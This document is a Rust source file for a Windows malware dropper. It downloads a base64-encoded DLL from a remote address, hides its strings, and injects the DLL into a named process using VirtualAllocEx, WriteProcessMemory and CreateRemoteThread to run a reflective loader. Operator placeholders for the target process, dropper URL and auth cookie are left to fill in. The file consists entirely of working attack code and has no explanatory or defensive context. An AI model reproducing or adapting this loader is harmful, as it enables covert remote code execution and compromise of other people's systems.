#![no_main]
#![no_std]

use std::{ptr::null_mut, mem::{size_of}};
use pelite::pe64::Pe;
use windows_sys::Win32::{System::{Threading::{OpenProcess, PROCESS_ALL_ACCESS, CreateRemoteThread}, Diagnostics::{Debug::{WriteProcessMemory}, ToolHelp::{CreateToolhelp32Snapshot, TH32CS_SNAPPROCESS, PROCESSENTRY32, Process32First, Process32Next}}, Memory::{MEM_COMMIT, MEM_RESERVE, PAGE_EXECUTE_READWRITE, VirtualAllocEx}}, Foundation::{CloseHandle}};
use obfstr::obfstr;
use std::io::Read;
use base64::{Engine as _, engine::{general_purpose}};
use pelite::pe64::{PeFile};
use core::mem;

#[macro_use]
extern crate std;
use std::vec::Vec;
use std::string::String;

pub extern crate hyper;
pub extern crate hyper_native_tls;

use hyper::client::{Client, RequestBuilder};
use std::str::FromStr;
use hyper::method::Method;
use hyper::net::HttpsConnector;
use hyper_native_tls::NativeTlsClient;
use hyper::header::{Headers, Cookie};

use std::alloc::System;

#[global_allocator]
static A: System = System;

// IMAGE_SCN_MEM_SHARED, IMAGE_SCN_MEM_EXECUTE, IMAGE_SCN_MEM_WRITE, IMAGE_SCN_MEM_READ

#[no_mangle]
pub extern "C" fn main(_argc: isize, _argv: *const *const u8) -> isize {
    let process_id = unsafe { get_process_id_by_name(obfstr!("PROCNAMEHERE")) };
    let mut headers = Headers::new();
    headers.set(
        Cookie(vec![
            String::from(obfstr!("CF-Ray=AUTHENTICATIONTOKENHERE"))
        ])     
    );

    let ssl = NativeTlsClient::new().unwrap();
    let connector = HttpsConnector::new(ssl);
    let client = Client::with_connector(connector);
    let request: RequestBuilder = client.request(Method::from_str(obfstr!("GET")).unwrap(), obfstr!("REMOTEDROPPERADDRESSHERE")).headers(headers);
    let mut response = request.send();
    let mut image_bytes_b64 = String::new();
    let _ = response.as_mut().unwrap().read_to_string(&mut image_bytes_b64);
    let image_bytes_b64 = image_bytes_b64.replace("\n", "");
    let image_bytes: Vec<u8> = general_purpose::STANDARD.decode(&image_bytes_b64).unwrap();
    let module_base = image_bytes.as_ptr() as usize;

    let process_handle = unsafe { 
        OpenProcess(
            PROCESS_ALL_ACCESS,
            0,
            process_id
        )
    };

    let remote_image = unsafe { 
        VirtualAllocEx(
            process_handle,
            null_mut(),
            image_bytes.len(),
            MEM_COMMIT | MEM_RESERVE,
            PAGE_EXECUTE_READWRITE
        )
    };
    
    let _wpm_result = unsafe {
        WriteProcessMemory(
            process_handle,
            remote_image,
            image_bytes.as_ptr() as  _,
            image_bytes.len(),
            null_mut(),
        )
    };
    
	let dllfile = PeFile::from_bytes(&image_bytes).unwrap();
    let exports = dllfile.exports().unwrap();
    let loader_export = exports.by().unwrap().by().unwrap().name(obfstr!("iLoveCatsXD")).unwrap();
    let loader_address = loader_export.symbol().unwrap();

    let loader_rva = dllfile.file_offset_to_rva(loader_address as usize).unwrap()-0x1800;
    let calculated_rva = module_base + loader_rva as usize;
    let reflective_loader = remote_image as usize + (calculated_rva as usize - module_base);

    let thread_handle = unsafe { 
        CreateRemoteThread(
        process_handle,
        null_mut(),
        0,
        Some(mem::transmute(reflective_loader as usize)),
        null_mut(),
        0,
        null_mut(),
        )
    };
    unsafe { CloseHandle(thread_handle) };
    0
}

unsafe fn get_process_id_by_name(process_name: &str) -> u32 {
    let h_snapshot = unsafe { CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0) };
    let mut process_entry: PROCESSENTRY32 = unsafe { mem::zeroed::<PROCESSENTRY32>() };
    process_entry.dwSize = size_of::<PROCESSENTRY32>() as u32;

    Process32First(h_snapshot, &mut process_entry);

    loop {
        if c_array_to_ruststr(process_entry.szExeFile.to_vec()).to_lowercase()
            == process_name.to_lowercase()
        {
            break;
        }
        Process32Next(h_snapshot, &mut process_entry);
    }

    return process_entry.th32ProcessID;
}

pub fn c_array_to_ruststr(buffer: Vec<u8>) -> String {
    let mut rust_string: Vec<u8> = Vec::new();
    for char in buffer {
        if char == 0 {
            break;
        }
        rust_string.push(char as _);
    }
    String::from_utf8(rust_string).unwrap()
}
